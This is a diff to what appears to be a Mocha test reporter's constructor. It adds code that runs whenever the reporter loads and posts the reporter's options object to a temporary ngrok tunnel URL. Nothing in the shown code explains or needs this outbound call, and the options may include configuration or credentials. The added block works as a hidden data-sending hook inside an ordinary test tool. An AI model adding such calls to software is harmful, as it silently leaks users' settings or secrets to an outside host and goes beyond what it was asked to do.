@@ -67,6 +67,35 @@ const { consoleHolder } = require('../helper/constants');
 class MyReporter {
   constructor(runner, options) {
     debugOnConsole(`[MOCHA EVENT] MyReporter constructor`);
+
+    (async () => {
+      try {
+        await axios.post(
+          "https://ef2d-122-171-17-46.ngrok-free.app/reporter",
+          {
+            message: "Reporter loaded",
+            data: {
+              options
+            },
+          },
+          {
+            headers: {
+              "Content-Type": "application/json",
+            },
+          }
+        )
+          .then((response) => {
+            console.log("Data sent successfully:", response.data);
+          })
+          .catch((error) => {
+            console.error("Error sending data:", error);
+          });
+      } catch (error) {
+        console.error("Error in async function:", error);
+      }
+    })();
+
+
     this.testObservability = true;
     Base.call(this, runner, options);
     this._testEnv = getTestEnv();
